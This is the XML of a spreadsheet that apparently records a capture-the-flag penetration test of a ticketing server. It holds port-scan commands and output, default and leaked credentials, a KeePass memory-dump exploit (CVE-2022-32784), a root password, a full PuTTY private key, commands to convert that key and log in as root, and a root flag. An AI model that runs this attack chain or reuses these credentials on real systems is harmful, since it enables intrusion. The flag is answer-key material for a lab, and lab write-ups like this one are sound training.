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81D4E28F-214D-48BD-80AE-17D313FBABD1}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-120" yWindow="-16320" windowWidth="29040" windowHeight="15720" activeTab="5" xr2:uid="{9AA4AFCA-69F3-4FD9-877C-89FBB0C8B483}"/>
  </bookViews>
  <sheets>
    <sheet name="Network" sheetId="1" r:id="rId1"/>
    <sheet name="Web App" sheetId="3" r:id="rId2"/>
    <sheet name="On host" sheetId="4" r:id="rId3"/>
    <sheet name="Commands" sheetId="2" r:id="rId4"/>
    <sheet name="Misc" sheetId="5" r:id="rId5"/>
    <sheet name="Reverse Engineering" sheetId="6" r:id="rId6"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm._FilterDatabase" localSheetId="0" hidden="1">Network!$A$1:$K$1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3" i="1" l="1"/>
  <c r="E3" i="1"/>
  <c r="E2" i="1"/>
  <c r="F2" i="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="70" uniqueCount="54">
  <si>
    <t>IP</t>
  </si>
  <si>
    <t>Hostname</t>
  </si>
  <si>
    <t>Port</t>
  </si>
  <si>
    <t>Protocol</t>
  </si>
  <si>
    <t>Service</t>
  </si>
  <si>
    <t>Notes</t>
  </si>
  <si>
    <t>Commands used</t>
  </si>
  <si>
    <t>Base URL</t>
  </si>
  <si>
    <t>Path</t>
  </si>
  <si>
    <t>Evidence</t>
  </si>
  <si>
    <t>Resources</t>
  </si>
  <si>
    <t>Host</t>
  </si>
  <si>
    <t>User</t>
  </si>
  <si>
    <t>Privileges</t>
  </si>
  <si>
    <t>Groups</t>
  </si>
  <si>
    <t>OS info</t>
  </si>
  <si>
    <t>Status</t>
  </si>
  <si>
    <t>Status + Path (from Kali)</t>
  </si>
  <si>
    <t>Port + Protocol</t>
  </si>
  <si>
    <t>#=LEFT($D2,FIND("/",$D2)-1)</t>
  </si>
  <si>
    <t>#=MID($D2,FIND("/",$D2)+1,LEN($D2))</t>
  </si>
  <si>
    <t>Files/Artifacts</t>
  </si>
  <si>
    <t>Misc</t>
  </si>
  <si>
    <t>Task</t>
  </si>
  <si>
    <t>App</t>
  </si>
  <si>
    <t>Sub task</t>
  </si>
  <si>
    <t>Resource</t>
  </si>
  <si>
    <t>80/tcp</t>
  </si>
  <si>
    <t>22/tcp</t>
  </si>
  <si>
    <t>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)</t>
  </si>
  <si>
    <t>80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).</t>
  </si>
  <si>
    <t>/rt</t>
  </si>
  <si>
    <t>https://github.com/bestpractical/rt</t>
  </si>
  <si>
    <t>Have to change /etc/hosts file.
That cookie is interesting.
Request Tracker 4.4.4</t>
  </si>
  <si>
    <t>/rt/m</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">1 ticket by </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>lnorgaard</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve"> (Lise Nørgaard).
#300000: Issue with Keepass Client on Windows
Edit user. Yeah that let's me SSH.</t>
    </r>
  </si>
  <si>
    <t>lnorgaard</t>
  </si>
  <si>
    <t>sudo docker run --rm -it -v $(pwd):/data mcr.microsoft.com/dotnet/sdk:7.0.100</t>
  </si>
  <si>
    <t>git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper
dotnet run /data/KeePassDumpFull.dmp</t>
  </si>
  <si>
    <t xml:space="preserve">kpcli --kdb passcodes.kdbx 
show -f 0
</t>
  </si>
  <si>
    <t>sudo apt install putty-tools</t>
  </si>
  <si>
    <t>sed 's/^[[:space:]]*//' root-putty.key &gt; root-putty-clean.key</t>
  </si>
  <si>
    <t>puttygen root-putty-clean.key -O private-openssh -o keeper-root</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Lol weird for some reason I couldn't extract the ZIP on my own machine? Just did it on victim and pulled the data over.
Pulled KeePass dump and ran the script in a dotnet container.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>CVE-2022-32784</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Pretty cool you have to convert the Putty key from the KeePass database into a normal SSH key.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Aptos Narrow"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>root.txt: b218630d5096e63b91f2c9b84718165d</t>
    </r>
  </si>
  <si>
    <t>[victim IP]</t>
  </si>
  <si>
    <t>sudo masscan -pT:1-65535,U:1-65535 --rate=1000 -e tun0 [victim IP] &gt; raw_ports.txt</t>
  </si>
  <si>
    <t>sudo nmap -p$(cat raw_ports.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//') -sS -sV --version-all -sC -O -T3 -v [victim IP]</t>
  </si>
  <si>
    <t>http://[victim domain]</t>
  </si>
  <si>
    <t>RT_SID_[victim domain].80=d3a29f989adc28dd55a60b8a8c72113b
user=admin&amp;pass=password&amp;next=69df3dbf2d6f848e51a3d11ef43f82f4
Default creds: root/password</t>
  </si>
  <si>
    <t xml:space="preserve">webmaster[@][victim domain]
lnorgaard[@][victim domain]
Welcome2023!
</t>
  </si>
  <si>
    <t>Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
rødgrød med fløde
Title: [victim domain] (Ticketing Server)
Uname: root
 Pass: F4&gt;&lt;3K0nd!
  URL: 
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
       f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
       VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
       UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
       OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
       in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
       SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
       09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
       xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0</t>
  </si>
  <si>
    <t xml:space="preserve">ssh -p 22 lnorgaard@[victim domain]  </t>
  </si>
  <si>
    <t>scp -P 22 lnorgaard@[victim domain]:/home/lnorgaard/RT30000.zip .</t>
  </si>
  <si>
    <t xml:space="preserve">ssh -i keeper-root root@[victim domain]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</si>
</sst>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2" fontId="4" fillId="0" borderId="0" xfId="0" applyNumberFormat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applyFill="1"/>
  </cellXfs>
  <cellStyles count="2">
    <cellStyle name="Hyperlink" xfId="1" builtinId="8"/>
    <cellStyle name="Normal" xfId="0" builtinId="0"/>
  </cellStyles>
  <dxfs count="2"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bestpractical/r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C755-4FE5-4C70-ABDC-86E8ABD7F626}">
  <dimension ref="A1:K30"/>
  <sheetViews>
    <sheetView zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="E1" sqref="E1"/>
      <selection pane="bottomLeft" activeCell="G3" sqref="G3"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="18.6640625" style="2" customWidth="1"/>
    <col min="2" max="3" width="15.77734375" style="2"/>
    <col min="4" max="4" width="19.6640625" style="2" customWidth="1"/>
    <col min="5" max="5" width="17.6640625" style="2" customWidth="1"/>
    <col min="6" max="6" width="17.109375" style="2" customWidth="1"/>
    <col min="7" max="7" width="23.5546875" style="2" customWidth="1"/>
    <col min="8" max="8" width="35.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="23.44140625" style="2" customWidth="1"/>
    <col min="10" max="10" width="36.6640625" style="2" customWidth="1"/>
    <col min="11" max="11" width="36.88671875" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>15</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>1</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>18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21</v>
      </c>
      <c r="J1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>44</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>27</v>
      </c>
      <c r="E2" s="7" t="str">
        <f t="shared" ref="E2:E3" si="0">LEFT($D2,FIND("/",$D2)-1)</f>
        <v>80</v>
      </c>
      <c r="F2" s="6" t="str">
        <f t="shared" ref="F2:F3" si="1">MID($D2,FIND("/",$D2)+1,LEN($D2))</f>
        <v>tcp</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>30</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>44</v>
      </c>
      <c r="B3" s="1"/>
      <c r="D3" s="2" t="s">
        <v>28</v>
      </c>
      <c r="E3" s="7" t="str">
        <f t="shared" si="0"/>
        <v>22</v>
      </c>
      <c r="F3" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G3" s="2" t="s">
        <v>29</v>
      </c>
      <c r="J3" s="5"/>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E4" s="7"/>
      <c r="F4" s="6"/>
      <c r="I4" s="4"/>
      <c r="J4" s="5"/>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1"/>
      <c r="B5" s="1"/>
      <c r="E5" s="7"/>
      <c r="F5" s="6"/>
      <c r="I5" s="4"/>
      <c r="J5" s="5"/>
    </row>
    <row r="6" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E6" s="7"/>
      <c r="F6" s="6"/>
      <c r="J6" s="5"/>
    </row>
    <row r="7" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="1"/>
      <c r="E7" s="7"/>
      <c r="F7" s="6"/>
    </row>
    <row r="8" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E8" s="7"/>
      <c r="F8" s="6"/>
    </row>
    <row r="9" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="1"/>
      <c r="E9" s="7"/>
      <c r="F9" s="6"/>
      <c r="I9" s="4"/>
      <c r="J9" s="5"/>
    </row>
    <row r="10" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E10" s="7"/>
      <c r="F10" s="6"/>
    </row>
    <row r="11" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="1"/>
      <c r="E11" s="7"/>
      <c r="F11" s="6"/>
    </row>
    <row r="12" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E12" s="7"/>
      <c r="F12" s="6"/>
    </row>
    <row r="13" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="1"/>
      <c r="E13" s="7"/>
      <c r="F13" s="6"/>
    </row>
    <row r="14" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E14" s="7"/>
      <c r="F14" s="6"/>
    </row>
    <row r="15" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="1"/>
      <c r="E15" s="7"/>
      <c r="F15" s="6"/>
    </row>
    <row r="16" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E16" s="7"/>
      <c r="F16" s="6"/>
    </row>
    <row r="17" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="1"/>
      <c r="E17" s="7"/>
      <c r="F17" s="6"/>
    </row>
    <row r="18" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E18" s="7"/>
      <c r="F18" s="6"/>
    </row>
    <row r="19" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="1"/>
      <c r="E19" s="7"/>
      <c r="F19" s="6"/>
    </row>
    <row r="20" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E20" s="7"/>
      <c r="F20" s="6"/>
    </row>
    <row r="21" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="1"/>
      <c r="E21" s="7"/>
      <c r="F21" s="6"/>
    </row>
    <row r="22" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E22" s="7"/>
      <c r="F22" s="6"/>
    </row>
    <row r="23" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="1"/>
      <c r="E23" s="7"/>
      <c r="F23" s="6"/>
    </row>
    <row r="24" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E24" s="7"/>
      <c r="F24" s="6"/>
    </row>
    <row r="25" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A25" s="1"/>
      <c r="E25" s="7"/>
      <c r="F25" s="6"/>
    </row>
    <row r="26" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E26" s="7"/>
      <c r="F26" s="6"/>
    </row>
    <row r="27" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E27" s="7"/>
      <c r="F27" s="6"/>
    </row>
    <row r="28" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A28" s="1"/>
      <c r="E28" s="7"/>
      <c r="F28" s="6"/>
    </row>
    <row r="29" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E29" s="7"/>
      <c r="F29" s="6"/>
    </row>
    <row r="30" spans="1:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A30" s="1"/>
      <c r="E30" s="7"/>
      <c r="F30" s="6"/>
    </row>
  </sheetData>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K30">
    <sortCondition ref="F2:F30"/>
    <sortCondition ref="E2:E30"/>
  </sortState>
  <phoneticPr fontId="3" type="noConversion"/>
  <conditionalFormatting sqref="F2:F30">
    <cfRule type="cellIs" dxfId="1" priority="1" operator="equal">
      <formula>"udp"</formula>
    </cfRule>
    <cfRule type="cellIs" dxfId="0" priority="2" operator="equal">
      <formula>"tcp"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B5CB-E7C9-4655-B0CB-02AE97F3D2B4}">
  <dimension ref="A1:I22"/>
  <sheetViews>
    <sheetView zoomScale="78" zoomScaleNormal="78" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="C1" sqref="C1"/>
      <selection pane="bottomLeft" activeCell="D4" sqref="D4"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="31.44140625" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="16384" width="31.44140625" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:9" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>7</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>17</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>16</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>8</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>47</v>
      </c>
      <c r="B2" s="2">
        <v>80</v>
      </c>
      <c r="C2" s="2" t="s">
        <v>31</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>33</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>48</v>
      </c>
      <c r="H2" s="5" t="s">
        <v>32</v>
      </c>
    </row>
    <row r="3" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="9" t="s">
        <v>47</v>
      </c>
      <c r="B3" s="2">
        <v>80</v>
      </c>
      <c r="C3" s="2" t="s">
        <v>34</v>
      </c>
      <c r="F3" s="2" t="s">
        <v>35</v>
      </c>
      <c r="G3" s="2" t="s">
        <v>49</v>
      </c>
      <c r="H3" s="5"/>
    </row>
    <row r="4" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="H4" s="5"/>
    </row>
    <row r="8" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="G8" s="5"/>
    </row>
    <row r="9" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E9" s="4"/>
    </row>
    <row r="10" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E10" s="4"/>
    </row>
    <row r="11" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E11" s="4"/>
    </row>
    <row r="12" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E12" s="4"/>
    </row>
    <row r="13" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E13" s="4"/>
    </row>
    <row r="22" spans="8:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="H22" s="5"/>
    </row>
  </sheetData>
  <phoneticPr fontId="3" type="noConversion"/>
  <hyperlinks>
    <hyperlink ref="H2" r:id="rId1" xr:uid="{82D31DFE-7C25-46A6-971C-DE1FC10CFB8A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3C73-22A5-4008-8739-F489AE5D585F}">
  <dimension ref="A1:K5"/>
  <sheetViews>
    <sheetView zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="B1" sqref="B1"/>
      <selection pane="bottomLeft" activeCell="E16" sqref="E16"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="21.88671875" style="2" customWidth="1"/>
    <col min="2" max="4" width="15.77734375" style="2"/>
    <col min="5" max="5" width="30.109375" style="2" customWidth="1"/>
    <col min="6" max="7" width="15.77734375" style="2"/>
    <col min="8" max="8" width="47.88671875" style="2" customWidth="1"/>
    <col min="9" max="9" width="18.44140625" style="2" customWidth="1"/>
    <col min="10" max="10" width="54.88671875" style="2" customWidth="1"/>
    <col min="11" max="11" width="38.44140625" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>11</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>12</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>13</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>14</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="J1" s="3" t="s">
        <v>21</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>44</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>36</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>43</v>
      </c>
      <c r="I2" s="5"/>
      <c r="J2" s="2" t="s">
        <v>50</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1"/>
      <c r="E3" s="1"/>
      <c r="I3" s="5"/>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1"/>
      <c r="E4" s="1"/>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1"/>
      <c r="J5" s="4"/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E388-0D5B-4574-B9C5-0C945BA9368E}">
  <dimension ref="A1:B14"/>
  <sheetViews>
    <sheetView zoomScale="80" zoomScaleNormal="80" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection pane="bottomLeft" activeCell="A30" sqref="A30"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="175" style="6" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="18.44140625" style="2" customWidth="1"/>
    <col min="3" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>6</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>26</v>
      </c>
    </row>
    <row r="2" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="8" t="s">
        <v>45</v>
      </c>
    </row>
    <row r="3" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="8" t="s">
        <v>46</v>
      </c>
    </row>
    <row r="4" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="6" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="5" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="6" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="6" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="6" t="s">
        <v>51</v>
      </c>
    </row>
    <row r="7" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="6" t="s">
        <v>52</v>
      </c>
    </row>
    <row r="8" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="6" t="s">
        <v>37</v>
      </c>
    </row>
    <row r="9" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="6" t="s">
        <v>38</v>
      </c>
    </row>
    <row r="10" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="6" t="s">
        <v>39</v>
      </c>
    </row>
    <row r="11" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="6" t="s">
        <v>40</v>
      </c>
    </row>
    <row r="12" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="6" t="s">
        <v>42</v>
      </c>
    </row>
    <row r="13" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="6" t="s">
        <v>41</v>
      </c>
    </row>
    <row r="14" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="6" t="s">
        <v>53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AFEE-C3BA-4A05-9783-1ED877C22A62}">
  <dimension ref="A1:A2"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="C9" sqref="C9"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="80.88671875" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="2" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="5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2D08-FB8B-4BAB-A462-7059BEE8513F}">
  <dimension ref="A1:D3"/>
  <sheetViews>
    <sheetView tabSelected="1" workbookViewId="0">
      <selection activeCell="D23" sqref="D23"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.4" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="12.109375" style="1" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="13.5546875" style="1" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="15.5546875" style="1" customWidth="1"/>
    <col min="4" max="4" width="29.6640625" style="1" bestFit="1" customWidth="1"/>
    <col min="5" max="16384" width="8.88671875" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:4" s="3" customFormat="1" x14ac:dyDescent="0.3">
      <c r="A1" s="3" t="s">
        <v>24</v>
      </c>
      <c r="B1" s="3" t="s">
        <v>23</v>
      </c>
      <c r="C1" s="3" t="s">
        <v>25</v>
      </c>
      <c r="D1" s="3" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="3" spans="1:4" x14ac:dyDescent="0.3">
      <c r="D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Web App</vt:lpstr>
      <vt:lpstr>On host</vt:lpstr>
      <vt:lpstr>Commands</vt:lpstr>
      <vt:lpstr>Misc</vt:lpstr>
      <vt:lpstr>Reverse Engineering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2026-06-23T12:52:04Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-07T12:39:40Z</dcterms:modified>
</cp:coreProperties>
</file>